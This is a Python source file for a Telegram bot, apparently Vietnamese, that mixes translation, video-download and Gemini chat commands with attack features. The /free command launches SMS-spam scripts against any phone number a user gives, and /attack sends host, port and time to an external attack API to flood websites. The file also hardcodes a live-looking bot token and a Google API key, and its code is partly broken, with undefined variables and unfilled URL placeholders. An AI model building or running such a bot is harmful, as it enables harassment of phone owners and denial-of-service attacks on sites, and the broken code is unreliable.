from keep_alive import keep_alive
keep_alive()

from gtts import gTTS
from googletrans import Translator
import telebot
import datetime
import time
import os
import subprocess
import random
import psutil
import sqlite3
import hashlib
import requests
import datetime
import sys
import pytube
import socket
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler,CallbackQueryHandler
import google.generativeai as genai
import html

bot_token = '7212380435:AAESyeHsC-IIm-63cgL82V2W-rAcd2K-rfc'
bot = telebot.TeleBot(bot_token)
translator = Translator()

allowed_users = []
processes = []
ADMIN_ID = '6895557861'

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()


def TimeStamp():
  now = str(datetime.date.today())
  return now


def load_users_from_database():
  cursor.execute('SELECT user_id, expiration_time FROM users')
  rows = cursor.fetchall()
  for row in rows:
    user_id = row[0]
    expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
    if expiration_time > datetime.datetime.now():
      allowed_users.append(user_id)


def save_user_to_database(connection, user_id, expiration_time):
  cursor = connection.cursor()
  cursor.execute(
      '''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
  connection.commit()


print("✧══════ ༺༻ •══════✧\nThe bot has been started successfully\n Buy inbox bot @hadukiii\n✧══════ ༺༻ •══════✧")


def add_user(message):
  admin_id = message.from_user.id
  if admin_id != ADMIN_ID:
    bot.reply_to(message, 'BẠN KHÔNG CÓ QUYỀN SỬ DỤNG LỆNH NÀY😾.')
    return

  if len(message.text.split()) == 1:
    bot.reply_to(message, ' VUI LÒNG NHẬP ID NGƯỜI DÙNG ')
    return

  user_id = int(message.text.split()[1])
  allowed_users.append(user_id)
  expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
  connection = sqlite3.connect('user_data.db')
  save_user_to_database(connection, user_id, expiration_time)
  connection.close()

  bot.reply_to(
      message,
      f'🚀NGƯỜI DÙNG CÓ ID {user_id} ĐÃ ĐƯỢC THÊM VÀO DANH SÁCH ĐƯỢC PHÉP SỬ DỤNG LỆNH /supersms.🚀'
  )


load_users_from_database()


@bot.message_handler(commands=['Vietnamese'])
def send_welcome(message):
    bot.reply_to(message, "Chào bạn! Hãy gửi một tin nhắn để tôi dịch nó sang tiếng Việt\n Ví dụ : /vn + Tiếng cần dịch.")

@bot.message_handler(commands=['vn'])
def translate_message(message):
    text = message.text
    translated_text = translator.translate(text, dest='vi').text
    bot.reply_to(message, f"-> {translated_text}")
    bot.reply_to(message, 'Language translation completed✅')

@bot.message_handler(commands=['English'])
def send_welcome(message):
    bot.reply_to(message, "Chào bạn! Hãy gửi một tin nhắn để tôi dịch nó sang tiếng anh\n Ví dụ : /el + Tiếng cần dịch.")

@bot.message_handler(commands=['el'])
def translate_message(message):
    text = message.text
    translated_text = translator.translate(text, dest='en').text
    bot.reply_to(message, f"-> {translated_text}")
    bot.reply_to(message, 'Language translation completed✅')




@bot.message_handler(commands=['check_website'])
def check_website(message):
    website_url = message.text.split()[1]
    try:
        response = requests.get(website_url)
        if response.status_code == 200:
            bot.reply_to(message, f"{website_url} is working fine!")
        else:
            bot.reply_to(message, f"{website_url} is not working, status code: {response.status_code}")
    except Exception as e:
        bot.reply_to(message, f"Error checking {website_url}: {str(e)}")

@bot.message_handler(commands=['check_host'])
def check_host(message):
    host = message.text.split()[1]
    try:
        ip = socket.gethostbyname(host)
        bot.reply_to(message, f"{host} is pointing to IP address: {ip}")
    except Exception as e:
        bot.reply_to(message, f"Error checking host: {str(e)}")
        
@bot.message_handler(commands=['free'])
def lqm_sms(message):
    user_id = message.from_user.id
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'PLEASE ENTER PHONE NUMBER\nHOW TO USE:  /free + phone number\nFor example: /free 038xxxxxxx')
        return

    phone_number = message.text.split()[1]
    if not phone_number.isnumeric():
        bot.reply_to(message, 'INVALID PHONE NUMBER !')
        return

    if phone_number in ['113','911','114','115','+84328774559','0328774559']:
        # Số điện thoại nằm trong danh sách cấm
        bot.reply_to(message,"Bạn Làm Gì Thế Spam Cả Admin Lun Chớ")
        return

    file_path1 = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "400"])    
    process = subprocess.Popen(["python", file_path2, phone_number, "200"])
    process = subprocess.Popen(["python", file_path3, phone_number, "300"])
    process = subprocess.Popen(["python", file_path4, phone_number, "300"])
    processes.append(process)
    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('free', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('free', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /free.")
        return
    video_url = "liemspam.000webhostapp.com/lon.mp4"  # Replace this with the actual video URL      
    message_text =f'Spam successful!!!\nAttack By: @{username} \nNumber of Attacks: {phone_number} \nJoin Kênh @LDV_LsTeam\n'
    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            

  


@bot.message_handler(commands=['start'])
def how_to(message):
  how_to_text = '''
 How to use and All Bot commands:
┌──────────⭓
│» /attack : Website Attack 
│» /free : Spam sms, for example: /free 038xxxxxxx
│» /check_website : Check Website. For example: /check_website + link
│» /check_host : Check the website server. For example : /check_host + link
│» /Vietnamese : Send all languages ​​and it will be translated into Vietnamese
│» /English : Submitting all languages ​​will return English
│» /tiktok : Download tiktok videos
│» /ask : GPT BOT
│» /id : check id you
│» /check : /check + [link] check anti ddos
│» /capcut : download video tiktok 
│» /status.
│» /admin: Display admin information.
└─────────────────────
'''
  bot.reply_to(message, how_to_text)





@bot.message_handler(commands=['admin'])
def how_to(message):
  how_to_text = '''
 Thông Tin Admin:
✧══════ ༺༻ •══════✧
- LE DUC VINH // LY QUANG VINH // 
🚀Thông Tin Liên Hệ ☎️:🚀
- Owner Telegram: https://t.me/Louisvinh
✧══════ ༺༻ •══════✧
'''
  bot.reply_to(message, how_to_text)

@bot.message_handler(commands=['tiktok'])
def luuvideo_tiktok(message):
  if len(message.text.split()) == 1:
    sent_message = bot.reply_to(message, 'Please enter link\nExample: /tiktok + (linkvideo)')
    return
  linktt = message.text.split()[1]
  data = f'url={linktt}'
  head = {
    "Host":"www.tikwm.com",
    "accept":"application/json, text/javascript, */*; q=0.01",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
  }
  response = requests.post("https://www.tikwm.com/api/",data=data,headers=head).json()
  linkz = response['data']['play']
  rq = response['data']
  tieude = rq['title']
  view = rq['play_count']
  sent_message = bot.reply_to(message, f'Please wait a moment..\n+ Title: {tieude}\n+ Number of views : {view}')
  try:
   bot.send_video(message.chat.id, video=linkz, caption=f'The video has been downloaded for you.\n│»Title: {tieude}\n│»Number of views: {view}', reply_to_message_id=message.message_id, supports_streaming=True)
  except Exception as e:
   bot.reply_to(message, f'Oh my God, Because the video is too heavy, you must download it using a link: {linkz}')
  bot.delete_message(chat_id=message.chat.id, message_id=sent_message.message_id)  

# Hàm tính thời gian hoạt động của bot
start_time = time.time()
@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} 𝐺𝑖𝑜̛̀, {minutes} 𝑃ℎ𝑢́𝑡, {seconds} 𝐺𝑖𝑎̂𝑦'
    bot.reply_to(message, f'𝐵𝑜𝑡 𝐷𝑎̃ 𝐻𝑜𝑎̣𝑡 𝐷𝑜̣̂𝑛𝑔 𝐷𝑢̛𝑜̛̣𝑐: {uptime_str}')
    


@bot.message_handler(commands=['status'])
def status(message):
  user_id = message.from_user.id
  process_count = len(processes)
  bot.reply_to(message, f'Số quy trình đang xử lý {process_count}.')


@bot.message_handler(commands=['khoidong'])
def restart(message):
  user_id = message.from_user.id
  if user_id != ADMIN_ID:
    bot.reply_to(message, 'Đã khởi động lại bot')
    return

  bot.reply_to(message, 'Bot sẽ được khởi động lại sau 3s')
  time.sleep(2)
  python = sys.executable
  os.execl(python, python, *sys.argv)


@bot.message_handler(commands=['dungbot'])
def stop(message):
  user_id = message.from_user.id
  bot.reply_to(message, 'Đã dừng bot')
  time.sleep(2)
  bot.stop_polling()



@bot.message_handler(commands=['ask'])
def gpt(message):
  
  chat_id = message.chat.id
  genai.configure(api_key="AIzaSyBeOeuX-CxrJw0bohXfkMi9ogQurWDp66c")

  generation_config = {
    "temperature": 0.9,
    "top_p": 1,
    "top_k": 1,
    "max_output_tokens": 2048,
  }

  safety_settings = [
    {
      "category": "HARM_CATEGORY_HARASSMENT",
      "threshold": "BLOCK_MEDIUM_AND_ABOVE"
    },
    {
      "category": "HARM_CATEGORY_HATE_SPEECH",
      "threshold": "BLOCK_MEDIUM_AND_ABOVE"
    },
    {
      "category": "HARM_CATEGORY_SEXUALLY_EXPLICIT",
      "threshold": "BLOCK_MEDIUM_AND_ABOVE"
    },
    {
      "category": "HARM_CATEGORY_DANGEROUS_CONTENT",
      "threshold": "BLOCK_MEDIUM_AND_ABOVE"
    }
  ]

  model = genai.GenerativeModel(model_name="gemini-1.5-pro-latest",
                            generation_config=generation_config,
                              safety_settings=safety_settings)
  start_time = time.time()
  prompt_parts = message.text.split()[1:]
  prompt_parts = ' '.join(prompt_parts)

  response = model.generate_content(prompt_parts)
  end_time = time.time()
  response_time = end_time - start_time
  bot.reply_to(message, f"┌──────────⭓\n{response.text}\n└─────────────────────\n status time:{response_time}\n", parse_mode="Markdown")
  


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = message.from_user.id
    bot.reply_to(message, f"📄 • User ID : {user_id}")




@bot.message_handler(commands=['capcut']) 
def handle_capcut(message): 
    try: 
        url = message.text.split()[1]  # Lấy URL từ lệnh capcut 
        api_url = f"https://sumiproject.io.vn/capcutdowload?url={url}" 
        response = requests.get(api_url) 
 
        if response.status_code == 200: 
            data = response.json() 
            title = data.get("title", "N/A") 
            description = data.get("description", "N/A") 
            usage = data.get("usage", "N/A") 
            video_url = data.get("video") 
 
            if video_url: 
                bot.send_message(message.chat.id, f"Mô Tả: {title}\nDescription: {description}\nLượt dùng: {usage}") 
                bot.send_video(message.chat.id, video_url) 
            else: 
                bot.reply_to(message, "Không tìm thấy URL video trong dữ liệu API.") 
        else: 
            bot.reply_to(message, "Không thể kết nối đến API. Vui lòng thử lại sau.") 
 
    except IndexError: 
        bot.reply_to(message, "Vui lòng cung cấp URL sau lệnh capcut.")



@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    
        
    if len(message.text.split()) < 5:
        bot.reply_to(message, ' 𝑷𝒍𝒆𝒂𝒔𝒆 𝑬𝒏𝒕𝒆𝒓 𝑪𝒐𝒓𝒓𝒆𝒄𝒕 𝑺𝒚𝒏𝒕𝒂𝒙.\n𝑭𝒐𝒓 𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : /attack + [𝒉𝒐𝒔𝒕] + [𝒑𝒐𝒓𝒕] + [𝒕𝒊𝒎𝒆] + [𝒎𝒆𝒕𝒉𝒐𝒅𝒔]\nCurrent Methods:\n FLOOD')
        return

    username = message.from_user.username

    args = message.text.split()
    host = args[1]
    port = args[2]
    time = args[3]
    method = args[4]

    if int(time) > 61:
        bot.reply_to(message, '𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆 𝑪𝒂𝒏𝒏𝒐𝒕 𝑬𝒙𝒄𝒆𝒆𝒅 𝟔𝟎 𝑺𝒆𝒄𝒐𝒏𝒅𝒔.')
        return

    username = message.from_user.username

    bot.reply_to(message, f'𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐚𝐩𝐢 𝐬𝐞𝐫𝐯𝐞𝐫 𝐟𝐚𝐢𝐥𝐞𝐝')

    args = message.text.split()
    host = args[1]
    port = args[2]
    time = args[3]
    method = args[4]
    
    # Gửi dữ liệu tới api
    api = f"https://kha.bartrickc2.ovh/api/attack?host=[host]&port=[port]&time=[time]&method={method}&key=dvinkls&username=ducvinhlord"
    response = requests.get(api)
    print("\n", response.text, "\n")

    bot.reply_to(message, f'Attack Target Successfully\n┣➤ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 : @{username}\n┣➤ 𝐓𝐚𝐫𝐠𝐞𝐭 : {host}\n┣➤ 𝐏𝐨𝐫𝐭 : {port}\n┣➤ 𝐓𝐢𝐦𝐞 : {time}\n┣➤ 𝐌𝐞𝐭𝐡𝐨𝐝 : {method}')
    


    
bot.infinity_polling(timeout=60, long_polling_timeout = 1)
